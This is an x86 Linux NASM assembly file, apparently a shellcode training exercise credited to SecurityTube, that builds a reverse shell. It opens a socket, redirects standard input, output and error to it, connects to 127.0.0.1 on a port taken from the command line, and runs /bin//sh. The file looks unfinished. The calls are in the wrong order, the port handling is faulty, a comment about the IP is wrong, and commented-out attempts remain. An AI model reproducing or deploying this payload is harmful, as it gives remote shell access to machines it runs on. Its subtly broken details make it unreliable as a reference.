; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
	mov	ecx, [esp+4]
	pop ecx			; argc in ecx
	cmp ecx, 3
	jnz exit  		; If argc != 3 -> EXIT
	;pop ecx 		; quito el nombre de la función	


socket:
	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	xor eax, eax
	mov ax, 0x167
	xor ebx, ebx
	mov bl, 2
	xor ecx, ecx
	mov cl, 1
	xor edx, edx
	int 0x80
	mov dword esi, eax
	jmp test

arg1:
	pop ecx ; get pointer to string
	;test ecx, ecx
	;jz exit
	xor edx, edx 

getlen: ; now we need to find the length of our (zero-terminated) string
	cmp byte [ecx + edx], 0
	jz print_ip
	inc edx
	jmp getlen

print_ip:
	;xor eax, eax
	;mov al, 0x4
	;xor ebx, ebx
	;mov bl, 1
	;int 0x80
	mov edi, ecx
	jmp arg2

test:
	pop ecx
	jmp arg1

arg2:
	pop ecx ; get pointer to string
	;test ecx, ecx
	;jz exit
	xor edx, edx 

getlen2: ; now we need to find the length of our (zero-terminated) string
	cmp byte [ecx + edx], 0
	jz print_ip2
	inc edx
	jmp getlen2

print_ip2:
	;edi = ip; ecx = port

;	xor eax, eax
;	mov al, 0x4
;	xor ebx, ebx
;	mov bl, 1
	;mov ecx, edi
;	int 0x80

	;xor edi, edi
	;push  dword [edi] 		; push 0 => ip=0.0.0.0
	
	;mov eax, [edi]
	;sub eax,'0'
	;push dword eax

	push 16777343			; 0x0100007f	ip=1.0.0.127 (big endian)
	;push word 47138 		; 0xb822		port=8888 (big endian)
    push word [ecx]
    push word 2 
	jmp dup2




dup2:
	;dup2 - 0
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	int 0x80
	;dup2 - 1
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 1
	int 0x80
	;dup2 - 2
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 2
	int 0x80



connect:
	;Connect - 362
	xor eax, eax
	mov ax, 0x16a
	mov ebx, esi
	
	;xor edi, edi
	;push dword edi 		; push 0 => ip 0.0.0.0
    ;push edi			; port 8888, big endian
    ;push word 0xb822 	; port 8888, big endian
    ;push word 2 
	mov ecx, esp

;	xor edi, edi
;	xor edx, edx
;	pop edi 		; argv 0
;	pop edi 		; argv 1
;	pop edx 		; argv 2
;	push dword edi 	; push IP (argv 1)
;	xor edi, edi
;	push edi			; port 8888, big endian
;	;push word edx
;	push word 0xb822
;	push word 2 
;	mov ecx, esp

	xor edx, edx
	mov dl, 0x66 		; 102
	int 0x80
	jmp execve




execve:
	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80


exit:
	; Print message
	xor eax, eax
	mov al, 0x4
	xor ebx, ebx
	mov bl, 1
	push 0x74697845
	mov ecx, esp
	xor edx, edx
	mov dl, 4
	int 0x80
	; Exit
	mov   eax,1
	mov   ebx,1
	int   0x80      ; Exit




